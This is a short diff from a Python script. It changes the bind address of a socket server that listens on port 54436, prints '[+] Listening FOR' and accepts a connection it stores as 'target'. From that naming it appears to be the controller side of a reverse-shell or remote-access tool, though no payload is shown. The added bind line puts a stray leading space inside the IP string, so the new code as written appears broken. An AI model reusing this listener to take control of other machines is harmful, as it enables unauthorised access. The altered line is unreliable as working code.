@@ -57,7 +57,8 @@ def server():
 	global target
 	sock =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	sock.bind(('10.0.2.15',54436))
+	#sock.bind(('100.20.118.82',54436))
+	sock.bind((' 172.31.20.248', 54436))
 	sock.listen(15)
 	print("[+] Listening FOR")
 	target, ip =sock.accept()
